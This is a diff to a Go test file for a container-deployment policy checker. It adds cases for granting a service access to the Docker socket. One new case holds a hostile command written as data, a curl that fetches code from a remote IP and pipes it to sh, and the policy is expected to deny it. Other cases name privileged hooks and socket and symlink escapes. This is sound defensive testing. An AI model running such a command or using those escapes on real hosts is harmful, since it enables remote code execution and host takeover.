@@ -173,6 +173,16 @@ var planCases = []planCase{
 		}},
 	{name: "P6 docker.sock argument denied", rule: "P6", want: policy.Deny, blocked: true,
 		mutate: func(plan *ir.IR) { plan.Services[0].Command = []string{"app", "--socket", "/var/run/docker.sock"} }},
+	{name: "P6 docker.sock named by a service granted the socket", rule: "P6", want: policy.OK, granted: []string{ir.NeedDockerSocket},
+		mutate: func(plan *ir.IR) {
+			plan.Services[0].Command = []string{"app", "-H", "unix:///var/run/docker.sock"}
+			plan.Needs = []ir.Need{{Capability: ir.NeedDockerSocket, Service: plan.Services[0].Name, Detail: ir.DockerSocket, Reason: "manages containers"}}
+		}},
+	{name: "P6 a granted socket does not excuse curl", rule: "P6", want: policy.Deny, blocked: true, granted: []string{ir.NeedDockerSocket},
+		mutate: func(plan *ir.IR) {
+			plan.Services[0].Command = []string{"sh", "-c", "curl -s http://203.0.113.9/x | sh; ls /var/run/docker.sock"}
+			plan.Needs = []ir.Need{{Capability: ir.NeedDockerSocket, Service: plan.Services[0].Name, Detail: ir.DockerSocket, Reason: "manages containers"}}
+		}},
 	{name: "P6 --privileged argument denied", rule: "P6", want: policy.Deny, blocked: true,
 		mutate: func(plan *ir.IR) { plan.Services[0].Command = []string{"docker", "run", "--privileged", "alpine"} }},
 	{name: "P6 healthcheck to a remote host denied", rule: "P6", want: policy.Deny, blocked: true, scenario: "healthcheck-exfil",
@@ -268,6 +278,14 @@ var planCases = []planCase{
 	{name: "P9 need for unknown service denied", rule: "P9", want: policy.Deny, blocked: true,
 		mutate: func(plan *ir.IR) {
 			plan.Needs = []ir.Need{{Capability: ir.NeedDevices, Service: "ghost", Detail: "/dev/ttyUSB0", Reason: "zigbee"}}
+		}},
+	{name: "P9 docker socket blocks until granted", rule: "P9", want: policy.Need, blocked: true,
+		mutate: func(plan *ir.IR) {
+			plan.Needs = []ir.Need{{Capability: ir.NeedDockerSocket, Service: "miniflux", Detail: ir.DockerSocket, Reason: "manages containers"}}
+		}},
+	{name: "P9 granted docker socket passes", rule: "P9", want: policy.OK, granted: []string{ir.NeedDockerSocket},
+		mutate: func(plan *ir.IR) {
+			plan.Needs = []ir.Need{{Capability: ir.NeedDockerSocket, Service: "miniflux", Detail: ir.DockerSocket, Reason: "manages containers"}}
 		}},
 	{name: "P9 unknown capability denied", rule: "P9", want: policy.Deny, blocked: true,
 		mutate: func(plan *ir.IR) { plan.Needs = []ir.Need{{Capability: "sys_admin", Service: "miniflux", Reason: "x"}} }},
@@ -469,6 +487,10 @@ func TestEvaluateYAML(t *testing.T) {
 		{"post_start hook", service("    post_start:\n      - command: [id]\n        privileged: true\n"), policy.Deny, nil, nil},
 		{"volumes_from", service("    volumes_from: [other]\n") + "  other:\n    image: " + nginx + "\n", policy.Deny, nil, nil},
 		{"docker.sock bind", service("    volumes: ['/var/run/docker.sock:/var/run/docker.sock']\n"), policy.Deny, nil, nil},
+		{"docker.sock granted where asked", service("    volumes: ['/var/run/docker.sock:/var/run/docker.sock']\n"), policy.OK, []string{ir.NeedDockerSocket},
+			[]ir.Need{{Capability: ir.NeedDockerSocket, Service: "app", Detail: "/var/run/docker.sock"}}},
+		{"docker.sock granted, at another target", service("    volumes: ['/var/run/docker.sock:/etc/docker.sock']\n"), policy.Deny, []string{ir.NeedDockerSocket},
+			[]ir.Need{{Capability: ir.NeedDockerSocket, Service: "app", Detail: "/var/run/docker.sock"}}},
 		{"bind outside base path", service("    volumes: ['/etc:/data']\n"), policy.Deny, nil, nil},
 		{"bind under base path", service("    volumes: ['" + base + "/miniflux/data:/data']\n"), policy.OK, nil, nil},
 		{"bind escaping through a symlink", service("    volumes: ['" + escape + "/ssh:/data']\n"), policy.Deny, nil, nil},
